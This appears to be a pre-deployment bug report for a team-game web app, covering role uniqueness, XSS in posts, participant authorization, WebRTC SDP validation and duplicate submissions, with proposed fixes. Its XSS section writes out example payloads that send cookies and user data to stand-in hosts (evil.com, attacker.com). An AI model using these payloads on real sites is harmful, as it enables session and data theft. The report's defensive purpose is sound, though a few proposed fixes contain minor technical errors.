# 🚨 CRITICAL GAME FIXES REQUIRED

**Date:** March 22, 2026  
**Priority:** BLOCKING - Must fix before production deployment  
**Status:** ✋ DO NOT DEPLOY

---

## VERIFIED CRITICAL ISSUES

### 1. 🔴 CRITICAL: Strategic Escape Role Key Uniqueness

**Severity:** CRITICAL  
**Impact:** Game-breaking - Same role can be assigned to multiple participants  
**Location:** `database/schema.sql` lines 296-312

**Problem:**
```sql
CREATE TABLE strategic_roles (
  game_session_id UUID NOT NULL,
  participant_id UUID NOT NULL,
  role_key VARCHAR(50) NOT NULL,  -- ⚠️ NOT UNIQUE per session!
  UNIQUE (game_session_id, participant_id)  -- Only ensures 1 role per participant
);
```

Currently, you can have:
```
Session A:
  - Participant 1 → role_key = 'ceo'
  - Participant 2 → role_key = 'ceo'  ✗ DUPLICATE ALLOWED!
  - Participant 3 → role_key = 'hr'
```

**Root Cause:**
The constraint `UNIQUE (game_session_id, participant_id)` only ensures each participant has one role, NOT that roles are unique across the session.

**Fix Required:**
Add a second unique constraint:

```sql
-- File: database/schema.sql (lines 296-312)
-- Add this constraint after existing UNIQUE:

ALTER TABLE strategic_roles
ADD CONSTRAINT unique_role_per_session UNIQUE (game_session_id, role_key);
```

Or create a migration:

```sql
-- database/migrations/20260322_fix_strategic_roles_uniqueness.sql

ALTER TABLE strategic_roles
ADD CONSTRAINT unique_role_per_session UNIQUE (game_session_id, role_key);

-- Add comment explaining the constraint
COMMENT ON CONSTRAINT unique_role_per_session ON strategic_roles 
IS 'Ensures each role is assigned to exactly one participant per game session';
```

**Verification Query After Fix:**
```sql
-- This should return 0 rows (no duplicates)
SELECT game_session_id, role_key, COUNT(*) as count
FROM strategic_roles
GROUP BY game_session_id, role_key
HAVING COUNT(*) > 1;
```

**Estimated Time to Fix:** 2 minutes (add constraint) + 2 minutes (test) = **4 minutes**

---

### 2. 🔴 CRITICAL: Wins of Week - XSS Vulnerability (Post Content)

**Severity:** CRITICAL  
**Impact:** Security breach - JavaScript injection possible  
**Location:** `src/services/events-messages.service.ts` or post creation endpoint

**Problem:**
```typescript
// Currently: Post content stored as-is without sanitization
const createPostSchema = z.object({
  content: z.string().min(1).max(5000)
  // ⚠️ No HTML sanitization!
});

// User can submit:
// <img src=x onerror="alert('XSS')">
// Or: <script>document.location='https://evil.com?cookie='+document.cookie</script>

// When other users view the post, JavaScript executes in their browser
```

**Attack Vector:**
1. Attacker creates post with: `<img src=x onerror="fetch('https://attacker.com/steal?data='+JSON.stringify(window.userData))">`
2. Other users view the post
3. Their browser runs the JavaScript
4. Attacker steals authentication tokens, personal data, etc.

**Root Cause:**
No HTML sanitization before storing in database.

**Fix Required:**

Option A (Recommended - Server-side):
```typescript
// File: src/services/events-messages.service.ts or posts.service.ts
import DOMPurify from 'dompurify';

const createPostSchema = z.object({
  content: z.string()
    .min(1)
    .max(5000)
    .transform((val) => {
      // Sanitize server-side before storage
      return DOMPurify.sanitize(val, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
        ALLOWED_ATTR: ['href', 'target'],
        KEEP_CONTENT: true
      });
    })
});

// In service method:
async createPost(eventId: string, authorParticipantId: string, content: string) {
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    KEEP_CONTENT: true
  });
  
  return await query(
    `INSERT INTO activity_posts (event_id, author_participant_id, content, created_at)
     VALUES ($1, $2, $3, NOW())
     RETURNING *`,
    [eventId, authorParticipantId, sanitized]
  );
}
```

Option B (Client-side + Server-side):
```typescript
// Also sanitize on frontend before rendering
// File: flowkyn_frontend/src/components/GamePlay.tsx or similar

import DOMPurify from 'dompurify';

export function PostCard({ post }) {
  return (
    <div className="post">
      <div dangerouslySetInnerHTML={{ 
        __html: DOMPurify.sanitize(post.content)
      }} />
    </div>
  );
}
```

**Verification After Fix:**
```typescript
// Test with XSS payload
const xssPayload = '<img src=x onerror="window.XSS_TEST=true">';
const sanitized = DOMPurify.sanitize(xssPayload);
console.assert(!sanitized.includes('onerror'), 'XSS script still present!');
console.assert(sanitized === '', 'Payload should be completely removed');
```

**Estimated Time to Fix:** 5 minutes (install + sanitize) + 5 minutes (test) = **10 minutes**

**Install DOMPurify:**
```bash
npm install isomorphic-dompurify
# or
npm install dompurify
npm install --save-dev @types/dompurify
```

---

## MAJOR ISSUES (High Priority)

### 3. 🟡 MAJOR: Participant Authorization Not Verified

**Severity:** HIGH  
**Impact:** User can submit game actions for other participants  
**Location:** `src/socket/gameHandlers.ts` - all game handlers

**Problem:**
```typescript
// Current code doesn't verify participant ownership
const { sessionId, roundId, actionType, payload } = gameActionSchema.parse(data);

// ⚠️ No check: Is the authenticated user the owner of this participant_id?
// The code uses socket.handshake.auth but then doesn't enforce it in actions
```

**Attack Vector:**
1. User A joins session with participant ID = `uuid-111`
2. User B connects to same socket
3. User B submits action with `participantId: uuid-111` (User A's participant)
4. System records action under User A, not User B
5. User B has effectively spoofed User A's actions

**Fix Required:**

```typescript
// File: src/socket/gameHandlers.ts (in each game action handler)

// Add middleware to verify participant ownership:
async function verifyParticipantOwnership(
  userId: string,
  eventId: string, 
  participantId: string
): Promise<boolean> {
  const result = await queryOne(
    `SELECT p.id FROM participants p
     JOIN organization_members om ON om.id = p.organization_member_id
     WHERE p.id = $1 
     AND p.event_id = $2 
     AND om.user_id = $3`,
    [participantId, eventId, userId]
  );
  return !!result;
}

// In game action handlers:
gameNamespace.on('game:action', async (data, callback) => {
  const { sessionId, actionType, payload } = gameActionSchema.parse(data);
  
  const session = await queryOne(
    'SELECT event_id FROM game_sessions WHERE id = $1',
    [sessionId]
  );
  
  const socket = this as AuthenticatedSocket;
  const userId = socket.handshake.auth.userId;
  
  // NEW: Verify participant ownership
  const participantId = socket.handshake.auth.participantId;
  const isOwner = await verifyParticipantOwnership(userId, session.event_id, participantId);
  
  if (!isOwner) {
    return callback({ error: 'Unauthorized: participant does not belong to authenticated user' });
  }
  
  // ... rest of action processing
});
```

**Estimated Time to Fix:** 10 minutes (add verification) + 10 minutes (test) = **20 minutes**

---

### 4. 🟡 MAJOR: Coffee Roulette - No SDP/ICE Validation

**Severity:** HIGH  
**Impact:** Malformed WebRTC offers can crash server or create failed connections  
**Location:** `src/socket/gameHandlers.ts` lines 70-95 (coffee voice schemas)

**Problem:**
```typescript
const coffeeVoiceOfferSchema = z.object({
  sdp: z.string()
    .min(1)
    .max(200000, 'SDP too large'),
  // ⚠️ No validation that SDP is valid format!
  // Could be: "lol", "garbage", "<script>", etc.
});

// Valid SDP should always start with "v=0" and have "m=" sections
// Invalid SDP causes:
// - Peer connection creation failure
// - Browser console errors (silent failures)
// - Failed calls with no error message to user
```

**Valid SDP Example:**
```
v=0
o=- 123456789 2 IN IP4 127.0.0.1
s=-
t=0 0
a=extmap-allow-mixed
a=msid-semantic: WMS stream
m=audio 9 UDP/TLS/RTP/SAVPF 111 63 ...
```

**Invalid SDP Examples (currently allowed):**
```
"garbage"
"<script>alert('xss')</script>"
"{"json": "object"}"
"v=0\nm=" (missing required fields)
```

**Fix Required:**

```typescript
// File: src/socket/gameHandlers.ts

function validateSDP(sdp: string): boolean {
  // Check for required SDP format
  if (!sdp.includes('v=0')) return false;  // SDP version
  if (!sdp.includes('o=')) return false;   // Origin line
  if (typeof sdp !== 'string') return false;
  if (sdp.length < 50) return false;       // Too short
  if (sdp.length > 200000) return false;   // Too long
  
  // Ensure no script tags
  if (sdp.includes('<script>') || sdp.includes('javascript:')) return false;
  
  return true;
}

const coffeeVoiceOfferSchema = z.object({
  sessionId: z.string().uuid(),
  pairId: z.string().uuid(),
  sdp: z
    .string()
    .min(50, 'SDP too short')
    .max(200000, 'SDP too large')
    .refine(
      (val) => validateSDP(val),
      { message: 'Invalid SDP format' }
    )
});

const coffeeVoiceIceCandidateSchema = z.object({
  sessionId: z.string().uuid(),
  pairId: z.string().uuid(),
  candidate: z.object({
    candidate: z.string()
      .min(1)
      .max(20000)
      .refine(
        (val) => {
          // ICE candidate must start with 'candidate:' or be valid
          return val === '' || val.startsWith('candidate:');
        },
        { message: 'Invalid ICE candidate format' }
      ),
    sdpMid: z.string().nullable(),
    sdpMLineIndex: z.number().int().nullable(),
    usernameFragment: z.string().nullable().optional(),
  }).strict()
});
```

**Test After Fix:**
```typescript
// Should reject invalid SDP
const invalid = "garbage";
expect(() => coffeeVoiceOfferSchema.parse({
  sessionId: 'uuid-123',
  pairId: 'uuid-456',
  sdp: invalid
})).toThrow('Invalid SDP format');

// Should accept valid SDP
const valid = "v=0\no=- 123 2 IN IP4 127.0.0.1\n...";
const result = coffeeVoiceOfferSchema.parse({
  sessionId: 'uuid-123',
  pairId: 'uuid-456',
  sdp: valid
});
expect(result.sdp).toBeDefined();
```

**Estimated Time to Fix:** 10 minutes (add validation) + 10 minutes (test) = **20 minutes**

---

### 5. 🟡 MAJOR: Two Truths - Duplicate Submission Prevention Missing

**Severity:** HIGH  
**Impact:** Player can submit multiple statement sets, confusing game state  
**Location:** `src/socket/gameHandlers.ts` (reduceTwoTruthsState function)

**Problem:**
```typescript
if (actionType === 'two_truths:submit') {
  // ⚠️ No check if this participant already submitted in this round!
  
  // This allows:
  // 1. Player A submits statements
  // 2. Player A submits different statements again
  // 3. Both sets recorded in game_actions table
  // 4. Game state confused about which statements to use
}
```

**Current Flow (Problematic):**
```
1. two_truths:submit received
2. Validate payload
3. Shuffle statements
4. Update state with new statements
5. Save to DB (game_actions table)

✗ No check for: Already submitted in round
```

**Fix Required:**

```typescript
// File: src/socket/gameHandlers.ts (in reduceTwoTruthsState)

if (actionType === 'two_truths:submit') {
  // Guard: only accept submissions during submit phase
  if (base.phase !== 'submit') return base;
  
  // NEW: Check for duplicate submission in this round
  const existingSubmission = await queryOne(
    `SELECT id FROM game_actions
     WHERE game_session_id = $1
     AND round_id = $2
     AND participant_id = $3
     AND action_type = 'two_truths:submit'`,
    [sessionId, roundId, participantId]
  );
  
  if (existingSubmission) {
    // Already submitted - reject or ignore
    console.log('[TwoTruths] Duplicate submission attempt', {
      sessionId,
      participantId,
      roundId
    });
    return base;  // Silently ignore, or send error callback
  }
  
  // ... rest of processing
}
```

**Better: Use Database Constraints:**

```sql
-- Add to schema for Two Truths:
ALTER TABLE game_actions
ADD CONSTRAINT unique_two_truths_submission 
UNIQUE(game_session_id, round_id, participant_id, action_type)
WHERE action_type = 'two_truths:submit';
```

Then in code:
```typescript
// Try to insert, catch constraint violation
try {
  await query(
    `INSERT INTO game_actions (...)
     VALUES (...)`,
    [...]
  );
} catch (err: any) {
  if (err.code === '23505') {  // Unique constraint violation
    console.log('[TwoTruths] Duplicate submission', { participantId });
    return base;
  }
  throw err;
}
```

**Estimated Time to Fix:** 5 minutes (add check) + 10 minutes (test) = **15 minutes**

---

## MINOR ISSUES (Medium Priority)

### 6. 🟢 MINOR: Post Content Tags - No Limit

**Severity:** MEDIUM  
**Impact:** Unlimited tags can bloat database  
**Location:** Database schema or post service

**Current:**
```sql
CREATE TABLE activity_posts (
  content TEXT NOT NULL,
  -- tags field (if it exists) can be unlimited array
);
```

**Fix:**
```typescript
const createPostSchema = z.object({
  content: z.string().min(1).max(5000),
  tags: z.array(z.string().min(1).max(50))
    .max(10, 'Maximum 10 tags allowed')
    .default([])
});
```

---

### 7. 🟢 MINOR: Coffee Roulette - Chat Timeout Not Enforced

**Severity:** MEDIUM  
**Impact:** Chat can extend past configured duration  
**Location:** Coffee Roulette game handlers

**Check:**
- Verify `chatEndsAt` is properly set
- Verify socket emits timeout event at timestamp
- Verify clients handle timeout event

---

### 8. 🟢 MINOR: Strategic Escape - Discussion Timeout

**Severity:** MEDIUM  
**Impact:** Discussion extends indefinitely  
**Location:** Strategic Escape game handlers

**Fix:**
- Add `discussion_ends_at` to game_sessions
- Auto-emit timeout event
- Force phase transition

---

## DEPLOYMENT CHECKLIST

Before deploying to production, MUST complete:

- [ ] **CRITICAL #1:** Add `UNIQUE (game_session_id, role_key)` to strategic_roles
- [ ] **CRITICAL #2:** Add DOMPurify sanitization to post creation
- [ ] **MAJOR #1:** Add participant ownership verification in all game handlers
- [ ] **MAJOR #2:** Add SDP/ICE validation to Coffee Roulette WebRTC
- [ ] **MAJOR #3:** Add duplicate submission check to Two Truths
- [ ] Test all 4 games end-to-end
- [ ] Run SQL: Verify no duplicate roles in production strategic_roles table
- [ ] Run XSS test on post creation
- [ ] Run authorization test on game actions

---

## ESTIMATED TOTAL FIX TIME

| Issue | Time | Critical |
|-------|------|----------|
| Strategic Role Uniqueness | 4 min | ✅ |
| XSS Vulnerability | 10 min | ✅ |
| Participant Auth | 20 min | ⚠️ |
| WebRTC Validation | 20 min | ⚠️ |
| Duplicate Submissions | 15 min | ⚠️ |
| **Total** | **69 minutes** | **5 issues** |

**Recommendation:** Allocate 2-3 hours including testing and code review.

---

**Status:** 🚨 DO NOT DEPLOY WITHOUT FIXES

**Next Steps:**
1. Create migration for strategic_roles constraint
2. Add sanitization to post service
3. Add authorization checks to gameHandlers
4. Add SDP validation
5. Add duplicate submission prevention
6. Full regression testing
7. Deploy fixes
8. Deploy rest of application

---

**Generated:** March 22, 2026  
**Priority:** BLOCKING
